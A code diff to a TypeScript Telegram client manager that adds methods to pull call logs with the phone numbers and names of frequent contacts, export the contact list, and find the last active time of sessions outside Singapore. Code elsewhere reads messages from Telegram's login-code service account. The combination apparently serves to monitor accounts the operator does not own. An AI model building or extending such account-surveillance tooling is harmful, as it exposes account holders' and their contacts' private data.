@@ -1,6 +1,6 @@
 import { TelegramClient } from 'telegram';
 import { StringSession } from 'telegram/sessions';
-import { NewMessage } from 'telegram/events';
+import { NewMessage, NewMessageEvent } from 'telegram/events';
 import { Api } from 'telegram/tl';
 import axios from 'axios';
 import * as fs from 'fs';
@@ -10,6 +10,7 @@ import { TotalList, sleep } from 'telegram/Helpers';
 import { Dialog } from 'telegram/tl/custom/dialog';
 import { LogLevel } from 'telegram/extensions/Logger';
 import { MailReader } from '../../IMap/IMap';
+import bigInt from 'big-integer';
 
 class TelegramManager {
     private session: StringSession;
@@ -216,7 +217,87 @@ class TelegramManager {
         return chatData;
     }
 
-    async handleEvents(event) {
+    async getCallLog() {
+        const result = <Api.messages.Messages>await this.client.invoke(
+            new Api.messages.Search({
+                peer: new Api.InputPeerEmpty(),
+                q: '',
+                filter: new Api.InputMessagesFilterPhoneCalls({}),
+                minDate: 0,
+                maxDate: 0,
+                offsetId: 0,
+                addOffset: 0,
+                limit: 200,
+                maxId: 0,
+                minId: 0,
+                hash: bigInt(0),
+            })
+        );
+
+        const callLogs = <Api.Message[]>result.messages.filter(
+            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
+        );
+
+        const filteredResults = {
+            outgoing: 0,
+            incoming: 0,
+            video: 0,
+            chatCallCounts: {},
+            totalCalls: 0
+        };
+        for (const log of callLogs) {
+            filteredResults.totalCalls++;
+            const logAction = <Api.MessageActionPhoneCall>log.action
+
+            const callInfo = {
+                callId: logAction.callId.toString(),
+                duration: logAction.duration,
+                video: logAction.video,
+                timestamp: log.date
+            };
+
+            // Categorize by type
+            if (log.out) {
+                filteredResults.outgoing++;
+            } else {
+                filteredResults.incoming++;
+            }
+
+            if (logAction.video) {
+                filteredResults.video++;
+            }
+
+            // Count calls per chat ID
+            const chatId = (log.peerId as Api.PeerUser).userId.toString();
+            if (!filteredResults.chatCallCounts[chatId]) {
+                const ent = <Api.User>await this.client.getEntity(chatId)
+                filteredResults.chatCallCounts[chatId] = {
+                    phone: ent.phone,
+                    username: ent.username,
+                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
+                    count: 0
+                };
+            }
+            filteredResults.chatCallCounts[chatId].count++;
+        }
+        const filteredChatCallCounts = Object.entries(filteredResults.chatCallCounts)
+            .filter(([chatId, details]) => details["count"] > 5)
+            .map(([chatId, details]) => ({
+                ...(details as any),
+                chatId,
+            }));
+        console.log({
+            ...filteredResults,
+            chatCallCounts: filteredChatCallCounts
+        });
+
+        return {
+            ...filteredResults,
+            chatCallCounts: filteredChatCallCounts
+        };
+    }
+
+    async handleEvents(event: NewMessageEvent) {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
                 console.log(event.message.text.toLowerCase());
@@ -323,6 +404,27 @@ class TelegramManager {
             throw error
         }
     }
+
+    async getLastActiveTime() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations());
+        let latest = 0
+        result.authorizations.map((auth) => {
+            if (!auth.country.toLowerCase().includes('singapore')) {
+                if (latest < auth.dateActive) {
+                    latest = auth.dateActive;
+                }
+            }
+        })
+        return latest
+    }
+
+    async getContacts() {
+        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({
+            hash: bigInt(0)
+        }));
+        return exportedContacts;
+    }
+
     async updateUsername(baseUsername) {
         let newUserName = ''
         let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
